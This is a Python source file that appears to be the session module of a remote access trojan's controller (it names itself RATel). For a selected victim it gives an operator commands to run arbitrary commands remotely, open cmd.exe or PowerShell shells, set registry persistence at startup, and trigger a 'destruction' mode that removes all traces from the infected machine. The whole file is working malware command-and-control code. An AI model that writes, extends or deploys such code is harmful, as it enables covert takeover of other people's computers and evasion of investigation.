import time 

from colorama import Fore,Style

from .other import printColor
from .other import areYouSure
from .other import printAllTarget

from .management import CheckConn
from .handler import Handler
from .sql import Sql
from .spawnshell import FakeCmd
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SPLIT

import threading
import platform 

if(platform.system() == "Linux"):
    import readline
else: #if windows
    import pyreadline

class Session:
    #This class is called when the target is selected.
   # sesssion = True
    def __init__(self,socket,ip_client,port_client,session_nb):
        self.sock = socket
        self.ip_client = ip_client
        self.port_client = port_client 
        self.session_nb = session_nb
        
       
    def help(self):
        '''-h or --help'''
        printColor("help","""
-h or --help : Displays all session mode commands.

-ls or --list : Displays all clients with their information.

-c : Executes a command and returns the result.(Don't forget to put the command in double quotes). 

--command : Start a command prompt (cmd.exe) on the remote machine.

--powershell : Start the powershell on the remote machine.

--persistence : Makes the client persistent at startup by changing the registry keys.

--destruction : Supprime le client  sur la machine distance et coupe la connexion.

-b or --back : Back to menu.
""") 

    def executeCommand(self,cmd_list):
        '''-c'''
        print("\n")
        cmd_list.pop(0) #delete "-c"
        
        tmp_cmd = " ".join(cmd_list) #list to string
        cmd = ""

        for char in tmp_cmd: #remove " 
            if(char == "\""):
                pass

            elif(char == " "): #if space
                cmd += " "

            else:
                cmd += char
    
    
        if(CheckConn().sendsafe(self.session_nb, self.sock, cmd)): #send data
        
            CheckConn().recvcommand(self.sock,4096) #XOR  The decryption of xor is automatic on this method.
            
        else:
            printColor("error","\n[-] An error occurred while sending the command.\n")
        

    def spawnShell(self,prog):
        '''--command or --powershell'''
        #Opens a shell on the remote machine. 

        printColor("information","\n[?] Execute -b or --back or exit to return to sessions mode.\n\n") 
        
        if(CheckConn().sendsafe(self.session_nb, self.sock, "MOD_SPAWN_SHELL:"+prog) ):
            FakeCmd(self.sock).main() #Run cmd
        
        else:
            printColor("error","\n[-] An error occurred while sending the command.\n")


    def lonelyPersistence(self):
        '''-p or --persistence'''
        #if Handler.dict_conn[self.session_nb][NB_ALIVE]:  #test is life
        mod_persi = "MOD_PERSISTENCE:default"
        if(CheckConn().sendsafe(self.session_nb, self.sock, mod_persi)): #send mod persi
            #printColor("information","[+] the persistence mod was sent.\n")
            
            reponse = CheckConn().recvsafe(self.sock,4096)
            if(reponse == "\r\n"):#Mod persi ok  
                printColor("successfully","\n[+] the persistence mod is well executed with success..\n")
            else:
                printColor("error","[-] the persistence mod could not be executed on the client.")

        else:
            printColor("error","[+] the persistence mod was not sent.\n")

    
    def lonelyDestruction(self):
        '''--destruction '''
        #send MOD_DESTRUCTION | stop the connection and then remove all traces on the target machine.

        printColor("information","\n[!] Are you sure you want to run the destruction mode on the client ? Once the destruction mode is launched the client removes all traces of RATel. This means that if you have several clients on the same machine they will all be deleted and therefore they will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")
        if(areYouSure()):
            mod_destruction  = "MOD_DESTRUCTION:default"
            if(CheckConn().sendsafe(self.session_nb, self.sock, mod_destruction)):
                
                reponse = CheckConn().recvsafe(self.sock, 4096).split(SPLIT)
                
                if(reponse[1] == "True" ): 
                
                    printColor("error", "\n[-] An error occurred while executing the destroy mode.")
                    printColor("error","[-] The client The connection therefore stays active.\n")
                
                else:
                    #not error
                    #If the destroy mode is executed then all clients with the same program name and IP address will be terminated. 
                    printColor("successfully","\n[+] The destruction mode is executed successfully.\n")
                    for key in Handler.dict_conn.keys():
                        if(Handler.dict_conn[key][NB_IP] == Handler.dict_conn[self.session_nb][NB_IP] and Handler.dict_conn[key][NB_SOCKET] != bool() ):
                            #print("wtf->",Handler.dict_conn[key][NB_SOCKET])
                            try:
                                Handler.dict_conn[key][NB_SOCKET].close()
                            except:
                                printColor("error","[-] Error in lonelyDestruction.\n")
                            printColor("information","[-] Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
                            CheckConn().connexionIsDead(key) 
            else:
                printColor("error", "[+] the destruction mod was not sent.\n")
        
        else:
            pass
        
        time.sleep(2) #Allows to wait for all connections to end (optional)

    def printInformation(self):
        pass


    def main(self): #Main function of the class | tpl = tuple session_nb = session number
        
        printColor("help","\n[?] Run -h or --help to list the available commands.\n")
        checker = True                                     #and checker why and ?
        while Handler.dict_conn[self.session_nb][NB_ALIVE] and checker: #If connexion is always connected (True) | The checker allows to break the loop when the -b or --back argument is executed without touching a NB_ALIVE 
            terminal = str(input(str(self.ip_client)+">")).split()
            for i in range(0,len(terminal)):   
                try:
                    if terminal[i] == "-h" or terminal[i] == "--help":
                        self.help()
                    
                    elif terminal[i] == "-ls" or terminal[i] == "--list":
                        printAllTarget()

                    elif terminal[i] == "--command":
                        self.spawnShell("cmd.exe")
                
                    elif  terminal[i] == "--powershell":
                        self.spawnShell("powershell.exe")
                    
                    elif terminal[i] == "--destruction":
                        self.lonelyDestruction()

                    elif terminal[i] == "-c":
                        self.executeCommand(terminal)

                    elif terminal[i] == "-b" or terminal[i] == "--back":
                        checker = False
                    
                    elif terminal[i] == "--persistence":
                        self.lonelyPersistence()
                    
                    else:
                        pass
                    
                except IndexError:
                    pass

        printColor("information","\n[-] The session was cut, back to menu.\n") #If the session close.